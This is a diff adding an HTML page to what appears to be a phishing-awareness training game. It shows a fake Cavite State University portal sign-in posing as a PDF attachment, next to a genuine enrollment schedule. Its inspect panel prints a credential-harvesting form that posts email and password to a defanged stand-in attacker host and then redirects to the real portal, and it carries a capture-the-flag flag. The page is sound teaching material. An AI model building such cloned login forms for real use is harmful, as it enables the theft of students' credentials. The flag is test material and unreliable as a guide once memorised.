@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+  <title>Sandbox preview</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <div class="sim-ribbon">Sandbox preview · nothing you type leaves this page</div>
+
+  <div class="topbar">
+    <button class="back-btn" id="back-link">&#8592; Message</button>
+    <span class="topbar-title mono" id="preview-file"></span>
+  </div>
+
+  <!-- R4: the "PDF" is really a web page posing as the portal -->
+  <div id="preview-fake" class="detail" style="display:none">
+    <div class="note" style="margin:0 0 10px">The file ends in <b>.html</b>, so it opens as a web page, not a document.</div>
+
+    <div class="fake-page">
+      <div class="fake-bar">🔒 portal.cvsu.edu.ph/view-document</div>
+      <div class="fake-inner">
+        <div class="fake-logo">CvSU Student Portal</div>
+        <div class="fake-title">Sign in to view "Enrollment schedule 2S"</div>
+        <label class="fake-label">CvSU email</label>
+        <input class="fake-input" type="email" placeholder="name@cvsu.edu.ph" autocomplete="off">
+        <label class="fake-label">Password</label>
+        <input class="fake-input" type="password" placeholder="••••••••" autocomplete="off">
+        <button class="fake-btn" onclick="fakeSignIn()">Sign in</button>
+      </div>
+    </div>
+    <div class="note">The address bar above is just part of the picture. This page was opened from a file on your phone, not from the portal.</div>
+
+    <div class="banner" id="signin-banner"></div>
+
+    <button class="cta" onclick="inspectPage()">INSPECT PAGE</button>
+
+    <div class="evidence" id="source">
+      <div class="evidence-head">
+        <span>
+          <span class="evidence-name">Page code · sign-in form</span>
+          <span class="evidence-sub">Where the typed details are sent</span>
+        </span>
+      </div>
+      <div class="evidence-body">
+<div class="rows">&lt;form method="POST"
+<span class="hot">      action="hxxps://collect.cvsu-portal-login.example/p.php"&gt;</span>
+  &lt;input name="email"&gt;
+  &lt;input name="password" type="password"&gt;
+<span class="hot">  &lt;input type="hidden" name="kit" value="CYBERITY{cl0n3d_h00k_f0und}"&gt;</span>
+  &lt;input type="hidden" name="then_redirect"
+<span class="warn">      value="https://portal.cvsu.edu.ph/schedule"&gt;</span>
+&lt;/form&gt;</div>
+        <div class="note">The form posts to the attacker's server, then redirects you to the real portal so nothing seems wrong.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- R5: the genuine schedule -->
+  <div id="preview-real" class="detail" style="display:none">
+    <div class="note" style="margin:0 0 10px">An ordinary PDF. It shows information and asks for nothing.</div>
+    <div class="doc-page">
+      <div class="doc-head">CAVITE STATE UNIVERSITY · OFFICE OF THE REGISTRAR</div>
+      <div class="doc-title">Enrollment Schedule · 2nd Semester, AY 2026-2027</div>
+      <table class="doc-table">
+        <tr><th>Date</th><th>Year level</th></tr>
+        <tr><td>Oct 6</td><td>4th year</td></tr>
+        <tr><td>Oct 7</td><td>3rd year</td></tr>
+        <tr><td>Oct 8</td><td>2nd year</td></tr>
+        <tr><td>Oct 9</td><td>1st year</td></tr>
+        <tr><td>Oct 10</td><td>Irregular and late enrollees</td></tr>
+      </table>
+      <div class="doc-foot">Enroll at the Registrar or through the portal you normally use.</div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+  <script>
+    renderPreview();
+    window.addEventListener('hashchange', renderPreview);
+  </script>
+</body>
+</html>
